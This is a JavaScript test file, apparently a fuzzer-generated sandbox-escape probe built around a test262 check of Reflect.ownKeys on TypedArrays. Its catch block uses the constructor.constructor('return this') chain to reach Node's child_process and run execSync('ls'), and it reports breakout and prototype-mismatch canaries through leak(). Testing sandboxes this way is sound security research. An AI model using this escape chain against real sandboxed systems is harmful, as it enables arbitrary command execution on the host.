try {
    TypedArray.prototype[3] = 42;
    TypedArray.prototype.bar = 42;
    testWithTypedArrayConstructors(function (TA) {
        var sample1 = new TA([
            42,
            42,
            42
        ]);
        sample1.test262 = 42;
        sample1.ecma262 = 42;
        var result1 = Reflect.ownKeys(sample1);
        assert(compareArray(result1, [
            '0',
            '1',
            '2',
            'test262',
            'ecma262'
        ]), 'result1');
        var sample2 = new TA(4).subarray(2);
        sample2.test262 = 42;
        sample2.ecma262 = 42;
        var result2 = Reflect.ownKeys(sample2);
        assert(compareArray(result2, [
            '0',
            '1',
            'test262',
            'ecma262'
        ]), 'result2');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}